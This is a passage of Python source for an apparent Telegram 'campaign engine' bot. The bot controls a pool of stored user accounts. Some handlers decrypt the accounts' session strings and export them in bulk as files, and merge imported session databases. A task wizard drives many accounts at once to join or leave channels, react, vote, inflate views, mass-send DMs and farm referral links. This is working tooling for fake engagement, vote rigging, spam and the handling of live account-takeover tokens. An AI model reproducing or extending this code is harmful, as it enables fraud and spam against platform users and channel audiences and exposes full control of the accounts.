            if r: payload.append({"phone": r[0], "user_id": r[1], "username": r[2], "session_string": decrypt_data(r[3])})
    f = BufferedInputFile(json.dumps(payload, indent=4).encode('utf-8'), filename="multi_sessions_bundle.txt")
    await callback.message.reply_document(document=f, caption=f"📦 Exported `{len(payload)}` accounts lines.")
    await state.clear()

@router.callback_query(F.data == "bulk_admin_export")
async def handle_bulk_admin_export(callback: CallbackQuery):
    await callback.answer()
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["admin", "owner", "super_owner"]: return
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        q = "SELECT phone, user_id, username, session_string FROM accounts WHERE status='active'" if role in ["owner", "super_owner"] else "SELECT phone, user_id, username, session_string FROM accounts WHERE user_id = ? AND status='active'"
        rows = await (await db.execute(q) if role in ["owner", "super_owner"] else await db.execute(q, (callback.from_user.id,))).fetchall()
    if not rows: return
    payload = [{"phone": r[0], "user_id": r[1], "username": r[2], "session_string": decrypt_data(r[3])} for r in rows]
    f = BufferedInputFile(json.dumps(payload, indent=4).encode('utf-8'), filename="bulk_admin_sessions.txt")
    await callback.message.reply_document(document=f, caption=f"📦 Bulk backup: `{len(payload)}` dumped lines.")

# --- STORAGE MAINTENANCE MODULES ---
@router.callback_query(F.data == "backup_panel")
async def backup_panel(callback: CallbackQuery):
    await callback.answer()
    buttons = [[InlineKeyboardButton(text="📥 Download Backup (.db)", callback_data="export_db")],
               [InlineKeyboardButton(text="📂 Upload & Restore", callback_data="import_db_start")],
               [InlineKeyboardButton(text="🔙 Back Menu", callback_data="main_menu")]]
    await callback.message.edit_text("💾 Database Snapshots Maintenance Panel", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data == "import_db_start")
async def import_db_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) not in ["owner", "super_owner"]: return
    await callback.message.edit_text("📤 Upload current system configuration backup database matching `.db` format types:")
    await state.set_state(RegistrationStates.waiting_for_db_file)

@router.message(StateFilter(RegistrationStates.waiting_for_db_file), F.document)
async def process_db_import_file(message: Message, state: FSMContext, bot: Bot):
    if not message.document.file_name.endswith('.db'): await state.clear(); return
    status = await message.answer("⚡ Merging structure records into database nodes...")
    tmp = f"imported_temp_{message.from_user.id}.db"
    try:
        await bot.download_file((await bot.get_file(message.document.file_id)).file_path, destination=tmp)
        u_cnt = a_cnt = 0
        import aiosqlite
        async with aiosqlite.connect(tmp) as s_db:
            try:
                async with s_db.execute("SELECT user_id, username, role, max_accounts FROM users") as cur:
                    async for r in cur:
                        async with aiosqlite.connect(db_mgr.db_path) as c_db:
                            await c_db.execute("INSERT OR IGNORE INTO users (user_id, username, role, max_accounts) VALUES (?, ?, ?, ?)", (r[0], r[1], r[2], r[3]))
                            await c_db.commit()
                        u_cnt += 1
            except Exception: pass
            try:
                async with s_db.execute("SELECT phone, user_id, username, session_string, status FROM accounts") as cur:
                    async for r in cur:
                        async with aiosqlite.connect(db_mgr.db_path) as c_db:
                            await c_db.execute("INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active) VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)", (str(r[0]), r[1], r[2], r[3], r[4]))
                            await c_db.commit()
                        a_cnt += 1
            except Exception: pass
        await status.edit_text(f"✅ Sync execution loop completed:\n👤 Users: `{u_cnt}`\n📱 Session tokens: `{a_cnt}`")
    except Exception as e: await status.edit_text(f"❌ Error: {e}")
    finally:
        if os.path.exists(tmp): os.remove(tmp)
        await state.clear()

@router.callback_query(F.data == "export_db")
async def export_db(callback: CallbackQuery):
    await callback.answer()
    try:
        with open(db_mgr.db_path, "rb") as f: file = BufferedInputFile(f.read(), filename="database_core_backup.db")
        await callback.message.reply_document(file, caption="📂 Current SQLite Database Backup File")
    except Exception as e: await callback.message.answer(f"❌ Failed: {e}")

# --- CAMPAIGN ENGINE TASK WIZARD FLOWS ---
@router.callback_query(F.data == "task_hub_start")
async def task_hub_select_type(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); await state.clear(); user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        q = "SELECT COUNT(*) FROM accounts WHERE status = 'active'" if role in ["admin", "owner", "super_owner"] else "SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?"
        count = (await (await db.execute(q) if role in ["admin", "owner", "super_owner"] else await db.execute(q, (user_id,))).fetchone())[0]

    text = f"🚀 Campaign Wizard Configuration Hub\n-----------------------------\n📱 Status check: `{count}` profiles online.\n\nStep 1: Pick an action to deploy:"
    await callback.message.edit_text(text=text, reply_markup=get_task_types_keyboard(count))
    await state.set_state(TaskWizardStates.choosing_type)

@router.callback_query(StateFilter(TaskWizardStates.choosing_type), F.data.startswith("set_type:"))
async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); task_type = callback.data.split(":")[1]
    await state.update_data(task_type=task_type)
    if task_type == "leave":
        await callback.message.edit_text("Step 2: Choose leave execution protocol profile mode:", reply_markup=get_leave_channel_options_keyboard())
        await state.set_state(TaskWizardStates.waiting_for_leave_choice)
    elif "react" in task_type or "vote" in task_type or task_type in ["view", "speed"]:
        await callback.message.edit_text("Step 2: Enter target handle name or channel public link context layout structure (e.g. `@channel`):")
        await state.set_state(TaskWizardStates.waiting_for_channel_link)
    elif task_type == "refer":
        await callback.message.edit_text("Step 2: Input structural referral url link parameters string (e.g. `https://t.me/Bot?start=123`):")
        await state.set_state(TaskWizardStates.waiting_for_post_link)
    else:
        await callback.message.edit_text("Step 2: Enter targeted public path link structure token:")
        await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_leave_choice), F.data.startswith("leave_mode:"))
async def task_hub_process_leave_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); mode = callback.data.split(":")[1]; await state.update_data(leave_mode=mode)
    if mode == "all":
        await state.update_data(target="ALL CHANNELS")
        await prompt_for_account_scale(callback.message, state)
    else:
        await callback.message.edit_text("Step 3: Paste the single channel URL link you want your IDs to leave from:")
        await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_channel_link))
async def task_hub_process_channel_link(message: Message, state: FSMContext):
    await state.update_data(channel_target=message.text.strip())
    await message.answer("Step 3: Paste message post track specific link structure token (e.g. `https://t.me/channel/123`):")
    await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_post_link))
async def task_hub_process_target(message: Message, state: FSMContext):
    target = message.text.strip(); await state.update_data(target=target)
    task_type = (await state.get_data()).get("task_type")
    if task_type in ["join", "leave", "refer", "view", "speed"]: await prompt_for_account_scale(message, state)
    elif "react" in task_type:
        await state.update_data(selected_emojis=[])
        await message.answer("Step 4: Select targeted reaction emojis:", reply_markup=get_emoji_selection_keyboard([]))
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    elif "vote" in task_type:
        await message.answer("Step 4: Type down the identical button choice text label parameter context matching target choice:")
        await state.set_state(TaskWizardStates.waiting_for_button_text)
    elif task_type == "dm":
        await message.answer("Step 4: Write message structural content string array lines to send out:")
        await state.set_state(TaskWizardStates.waiting_for_dm_text)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); emoji = callback.data.split(":")[1]; data = await state.get_data(); sel = data.get("selected_emojis", [])
    sel.remove(emoji) if emoji in sel else sel.append(emoji)
    await state.update_data(selected_emojis=sel)
    await callback.message.edit_reply_markup(reply_markup=get_emoji_selection_keyboard(sel))

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data == "finish_emoji_selection")
async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data(); sel = data.get("selected_emojis", [])
    if not sel: await callback.answer("⚠️ Highlight at least 1 option target index value.", show_alert=True); return
    await callback.answer(); await state.update_data(reactions=sel)
    if "vote" in data.get("task_type"):
        await callback.message.answer("Step 5: Type identical button matching layout target choice:")
        await state.set_state(TaskWizardStates.waiting_for_button_text)
    else: await prompt_for_account_scale(callback.message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
async def process_button_text(message: Message, state: FSMContext):
    await state.update_data(button_text=message.text.strip()); await prompt_for_account_scale(message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
async def process_dm_text(message: Message, state: FSMContext):
    await state.update_data(text=message.text.strip()); await prompt_for_account_scale(message, state)

async def prompt_for_account_scale(message: Message, state: FSMContext):
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        q = "SELECT COUNT(*) FROM accounts WHERE status = 'active'" if role in ["admin", "owner", "super_owner"] else "SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?"
        max_available = (await (await db.execute(q) if role in ["admin", "owner", "super_owner"] else await db.execute(q, (user_id,))).fetchone())[0]
        
    prompt_msg = f"🔢 Select Account Scaling Parameter\n\nOnline active session connection tokens total: `{max_available}`\nInput target scaling parameter variable count to run:\n(Type `0` to launch task with ALL profiles active)"
    await message.answer(prompt_msg) if isinstance(message, Message) else await message.answer(prompt_msg)
    await state.set_state(TaskWizardStates.waiting_for_account_scale)

@router.message(StateFilter(TaskWizardStates.waiting_for_account_scale))
async def process_account_scale(message: Message, state: FSMContext, bot: Bot):
    txt = message.text.strip()
    if not txt.isdigit(): await message.answer("❌ Invalid entry layout rules description format. Type numbers only:"); return
    req = int(txt); user_id = message.from_user.id; role = await db_mgr.get_user_role(user_id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        q = "SELECT COUNT(*) FROM accounts WHERE status = 'active'" if role in ["admin", "owner", "super_owner"] else "SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?"
        lim = (await (await db.execute(q) if role in ["admin", "owner", "super_owner"] else await db.execute(q, (user_id,))).fetchone())[0]

    if req > lim: await message.answer(f"❌ Selection boundary exceeded maximum resource pools: `{lim}`. Try downscaling:"); return
    await state.update_data(run_account_count=req)
    await finalize_task_creation(message, state, bot)

async def finalize_task_creation(message: Message, state: FSMContext, bot: Bot):
    data = await state.get_data(); user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    task_type = data.pop("task_type"); target = data.get("target", "")
    if data.get("leave_mode") != "all":
        _, link_msg_id = parse_telegram_link(target)
        if link_msg_id: data["msg_id"] = link_msg_id

    init_msg = await bot.send_message(chat_id=user_id, text="⏳ Bootstrapping engine deployment threads...\nConnecting endpoints, please wait...")
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute("INSERT INTO tasks (creator_id, type, payload) VALUES (?, ?, ?)", (user_id, task_type, json.dumps(data)))
        task_id = cursor.lastrowid; await db.commit()

    await task_queue.add_task(task_id, user_id, task_type, data, bot, init_msg.message_id)
    await state.clear()

# --- SYSTEM INTEGRATION METRICS ---
@router.callback_query(F.data == "view_tasks")
async def view_tasks(callback: CallbackQuery):
    await callback.answer(); user_id = callback.from_user.id; role = await db_mgr.get_user_role(user_id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        q = "SELECT task_id, type, status, progress FROM tasks ORDER BY task_id DESC LIMIT 10" if role in ["admin", "owner", "super_owner"] else "SELECT task_id, type, status, progress FROM tasks WHERE creator_id = ? ORDER BY task_id DESC LIMIT 10"
        rows = await (await db.execute(q) if role in ["admin", "owner", "super_owner"] else await db.execute(q, (user_id,))).fetchall()
    text = "📊 Historical Logging Event Feed Matrix\n\n"
    for r in rows: text += f"🔹 Task Log item: `#{r[0]}` (Type: `{r[1].upper()}`)\nState context: `{r[2]}` | Scale tracking: `{r[3]}`\nTo pull details type command layout: `/taskreport_{r[0]}`\n\n"
    await callback.message.edit_text(text or "No logging tracks present in repository.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))

@router.message(F.text.startswith("/taskreport_"))
async def cmd_task_report(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    try: task_id = int(message.text.split("_")[1])
    except: return
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        row = await (await db.execute("SELECT creator_id, type, status, progress FROM tasks WHERE task_id = ?", (task_id,))).fetchone()
    if not row or (role not in ["admin", "owner", "super_owner"] and row[0] != message.from_user.id): return
    await message.answer(f"📊 Profile Task Sheet ID: `#{task_id}`\n\nType: `{row[1].upper()}`\nStatus string: `{row[2]}`\nProgress level parameters mapping: `{row[3]}`", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Main Menu", callback_data="main_menu")]]))

@router.callback_query(F.data == "view_referrals")
async def view_referrals(callback: CallbackQuery):
    await callback.answer()
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        count = (await (await db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (callback.from_user.id,))).fetchone())[0]
    await callback.message.edit_text(f"👥 Invitation Tracking Matrix\n\nShare link to register profiles:\n`https://t.me/{bot_username}?start=ref_{callback.from_user.id}`\n\nTotal referrals registered under profile: `{count}`", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))

@router.callback_query(F.data == "admin_panel")
async def handle_admin_panel(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("🛠️ Admin Dashboard Matrix\n\nAvailable commands:\n🔹 `/addadmin <id> <limit>`\n🔹 `/removeadmin <id>`\n🔹 `/broadcast`\n🔹 `/canceltasks` - Kill loops", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))

@router.callback_query(F.data == "system_stats")
async def system_stats(callback: CallbackQuery):
    await callback.answer()
    if await db_mgr.get_user_role(callback.from_user.id) != "super_owner": return
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        total_users = (await (await db.execute("SELECT COUNT(*) FROM users")).fetchone())[0]
        total_accounts = (await (await db.execute("SELECT COUNT(*) FROM accounts")).fetchone())[0]
        active_accounts = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")).fetchone())[0]
        user_rows = await (await db.execute("SELECT user_id, username, role FROM users WHERE role = 'admin' OR user_id IN (SELECT DISTINCT user_id FROM accounts)")).fetchall()
        
        metrics = "\n👥 Account Allocations Map Matrix:\n"
        for u_id, u_name, u_role in user_rows:
            acc_count = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (u_id,))).fetchone())[0]
            metrics += f"• Profile: `{u_id}` (`@{u_name}`) [{u_role.upper()}] ➜ Linked: `{acc_count}`\n"
            
    await callback.message.edit_text(text=f"📈 Metrics Feed Summary\n\n👥 Users count: `{total_users}`\n📱 Sessions: `{total_accounts}`\n🟢 Active tokens: `{active_accounts}`\n----------------------------------------\n{metrics}", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))
